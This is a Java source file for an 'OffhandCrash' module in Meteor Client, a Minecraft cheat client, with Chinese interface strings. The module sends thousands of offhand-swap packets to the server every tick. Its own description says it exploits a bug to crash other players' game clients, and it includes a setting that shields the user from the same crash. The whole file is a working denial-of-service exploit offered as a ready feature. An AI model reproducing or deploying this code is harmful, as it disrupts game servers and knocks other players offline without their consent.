/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.player;

import io.netty.channel.Channel;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
        .name("崩溃")
        .description("每刻向服务器发送X个副手切换声音包。")
        .defaultValue(true)
        .build()
    );

    private final Setting<Integer> speed = sgGeneral.add(new IntSetting.Builder()
        .name("速度")
        .description("以刻为单位的切换数量。")
        .defaultValue(2000)
        .min(1)
        .sliderRange(1, 10000)
        .visible(doCrash::get)
        .build()
    );

    private final Setting<Boolean> antiCrash = sgGeneral.add(new BoolSetting.Builder()
        .name("防崩溃")
        .description("尝试防止你崩溃自己。")
        .defaultValue(true)
        .build()
    );

    public OffhandCrash() {
        super(Categories.Misc, "副手崩溃", "一个利用漏洞,通过在主手和副手之间切换来崩溃其他玩家的功能。");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!doCrash.get()) return;

        Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
        for (int i = 0; i < speed.get(); ++i) channel.write(PACKET);
        channel.flush();
    }

    public boolean isAntiCrash() {
        return isActive() && antiCrash.get();
    }
}
